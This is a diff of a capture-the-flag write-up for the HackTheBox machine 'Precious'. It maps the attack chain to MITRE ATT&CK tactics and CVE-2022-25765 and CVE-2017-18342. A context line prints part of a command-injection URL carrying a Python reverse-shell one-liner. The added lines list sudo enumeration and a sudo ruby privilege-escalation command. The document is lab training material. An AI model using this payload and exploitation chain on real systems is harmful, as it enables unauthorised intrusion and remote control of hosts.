@@ -23,12 +23,16 @@ Below, we map the attack to the MITRE ATT&CK Enterprise framework.
 | Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
 | - | - | - | - | - |
 | Reconnaissance | Gather Victim Host Information | Software | - | - |
+| Discovery | Software Discovery | - | - | - |
 | Initial Access | Exploit Public-Facing Application | - | (1) | CVE-2022-25765/CWE-78 |
 | Execution | Exploitation for Client Execution | - | (1) | CVE-2022-25765/CWE-78 |
-| Persistence | Valid Accounts | Local Accounts | (2) | - |
-| Discovery | System Owner/User Discovery | - | - | - |
 | Discovery | File and Directory Discovery | - | - | - |
+| Discovery | System Owner/User Discovery | - | - | - |
+| Credential Access | OS Credential Dumping | - | - | - |
+| Persistence | Valid Accounts | Local Accounts | (2) | - |
+| Discovery | Permission Groups Discovery | Local Groups | (3) | - |
 | Privilege Escalation | Exploitation for Privilege Escalation | - | [dependencies.yml](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Precious/dependencies.yml) | CVE-2017-18342/CWE-502 |
+| Execution | Command and Scripting Interpreter | Unix Shell | (4) | - |
 
 
 #### Commands/Scripts
@@ -39,6 +43,14 @@ http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INE
 - (2)
 ```
 ssh henry@10.10.11.189
+```
+- (3)
+```
+sudo -l
+```
+- (4)
+```
+sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
 #### Alternative Commands/Scripts
